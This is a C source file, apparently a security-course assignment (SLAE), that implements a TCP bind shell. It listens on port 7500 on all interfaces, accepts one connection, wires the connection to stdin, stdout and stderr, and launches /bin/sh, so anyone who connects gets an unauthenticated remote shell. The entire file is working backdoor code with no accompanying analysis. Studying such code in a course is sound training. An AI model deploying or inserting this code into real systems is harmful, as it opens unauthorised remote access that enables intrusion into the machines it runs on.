//Description:	Assignment #1 (PoC of Shell_Bind_TCP)
//Author: 		Paolo Stivanin <https://github.com/polslinux>
//SLAE ID:		526

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

int main(void){
	int fd, newfd;
	struct sockaddr_in server_addr;
	char *argv[] = { "/bin/sh", NULL };

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(7500);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	fd = socket(AF_INET, SOCK_STREAM, 0);

	bind(fd, (struct sockaddr *) &server_addr, 16);

	listen(fd, 1);

	newfd = accept(fd, NULL, NULL);

	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
	dup2(newfd, STDIN);
	dup2(newfd, STDOUT);
	dup2(newfd, STDERR);

	execve(argv[0], &argv[0], NULL);

	return 0;
}
